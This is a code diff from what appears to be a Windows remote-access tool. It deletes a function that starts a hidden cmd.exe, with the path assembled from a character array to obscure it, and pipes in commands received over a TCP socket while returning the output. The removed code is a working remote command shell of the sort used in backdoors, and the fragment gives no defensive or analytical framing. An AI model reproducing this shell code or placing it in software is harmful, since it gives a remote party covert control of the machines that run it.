@@ -47,37 +47,6 @@ bool ReadFromPipe() {
 		}
 	}
 }
-void StartCommandPrompt() {
-	char CommandRecived[1000] = { 0 };
-	char CMD[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','c','m','d','.','e','x','e','\x0' };
-	SIZE_T Recived_Len = 0;
-	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
-	CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
-	CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
-	STARTUPINFOA si = {};
-	si.cb = sizeof(STARTUPINFO);
-	si.dwFlags = STARTF_USESTDHANDLES;
-	si.hStdError = hStdOutPipeWrite;
-	si.hStdOutput = hStdOutPipeWrite;
-	si.hStdInput = hStdInPipeRead;
-	PROCESS_INFORMATION pi = {};
-	DWORD dwCreationFlags = 0;
-	CreateProcessA(CMD, 0, 0, 0, true, CREATE_NO_WINDOW, 0, 0, &si, &pi);
-	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ReadFromPipe, 0, 0, 0);
-	if (hThread) {
-		while (1) {
-			memset(CommandRecived, 0, 1000);
-			Recived_Len = recv(tcpsock, CommandRecived, 1000, 0);
-			if (!strncmp(CommandRecived, "exit", 4))break;
-			if (Recived_Len == -1) break;
-			WriteFile(hStdInPipeWrite, CommandRecived, Recived_Len, 0, 0);
-		}
-	}
-	TerminateThread(hThread, -1);
-	TerminateProcess(pi.hProcess, -1);
-}
-
-
 //Network functions:
 void Connecter() {
 	WSADATA wsaver;
